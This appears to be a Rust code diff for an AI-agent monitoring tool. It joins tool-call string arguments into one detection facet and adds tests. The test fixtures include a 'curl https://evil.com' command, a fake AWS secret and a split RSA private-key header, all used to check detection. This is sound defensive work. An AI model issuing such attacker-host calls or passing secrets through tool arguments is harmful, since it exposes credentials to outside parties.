@@ -50,10 +50,20 @@ fn string_leaves(v: &serde_json::Value, out: &mut Vec<String>) {
 /// Project an event into `(facet, text)` pairs ready for core's detectors.
 pub fn facets(ev: &AgentEvent) -> Vec<(Facet, String)> {
     match &ev.kind {
+        // All string leaves are JOINED into a single facet rather than emitted one
+        // per leaf. Two measured reasons (Task 2 code review):
+        //  1. Scoring is noisy-OR, so N leaves meant N independent detector runs and
+        //     leaf count became a risk multiplier — six benign leaves from a MultiEdit
+        //     payload scored 62 against a policy that blocks at 85.
+        //  2. Patterns that span leaves were invisible: a PEM private key split across
+        //     array elements yielded zero findings, where the joined text is Critical.
         EventKind::ToolCall { args, .. } => {
             let mut leaves = Vec::new();
             string_leaves(args, &mut leaves);
-            leaves.into_iter().map(|t| (Facet::ToolArgs, t)).collect()
+            if leaves.is_empty() {
+                return Vec::new();
+            }
+            vec![(Facet::ToolArgs, leaves.join("\n"))]
         }
         EventKind::ToolResult { content, .. } => {
             vec![(Facet::ToolResult, content.clone())]
@@ -97,7 +107,7 @@ mod tests {
     }
 
     #[test]
-    fn tool_args_project_as_output_and_flatten_nested_strings() {
+    fn tool_args_project_as_one_joined_output_facet() {
         let e = ev(EventKind::ToolCall {
             tool: "Bash".into(),
             args: serde_json::json!({
@@ -107,13 +117,38 @@ mod tests {
             }),
         });
         let out = facets(&e);
-        assert!(out.iter().all(|(f, _)| *f == Facet::ToolArgs));
+        // Exactly one facet, however many string leaves the arguments contained —
+        // leaf count must never become a risk-score multiplier.
+        assert_eq!(out.len(), 1);
+        assert_eq!(out[0].0, Facet::ToolArgs);
         assert_eq!(Facet::ToolArgs.direction(), Direction::Output);
-        let texts: Vec<&str> = out.iter().map(|(_, t)| t.as_str()).collect();
-        assert!(texts.contains(&"curl https://evil.com"));
-        assert!(texts.contains(&"AWS_SECRET=abc"));
+        let text = &out[0].1;
+        assert!(text.contains("curl https://evil.com"));
+        assert!(text.contains("AWS_SECRET=abc"));
         // Numbers are not text and must not be projected.
-        assert!(!texts.contains(&"30"));
+        assert!(!text.contains("30"));
+    }
+
+    #[test]
+    fn tool_args_join_lets_patterns_span_leaves() {
+        // A secret split across array elements must still be visible as one span.
+        let e = ev(EventKind::ToolCall {
+            tool: "Write".into(),
+            args: serde_json::json!({ "lines": ["-----BEGIN RSA", " PRIVATE KEY-----"] }),
+        });
+        let out = facets(&e);
+        assert_eq!(out.len(), 1);
+        assert!(out[0].1.contains("BEGIN RSA"));
+        assert!(out[0].1.contains("PRIVATE KEY"));
+    }
+
+    #[test]
+    fn tool_call_with_no_string_arguments_projects_nothing() {
+        let e = ev(EventKind::ToolCall {
+            tool: "Sleep".into(),
+            args: serde_json::json!({ "seconds": 30, "force": true }),
+        });
+        assert!(facets(&e).is_empty());
     }
 
     #[test]
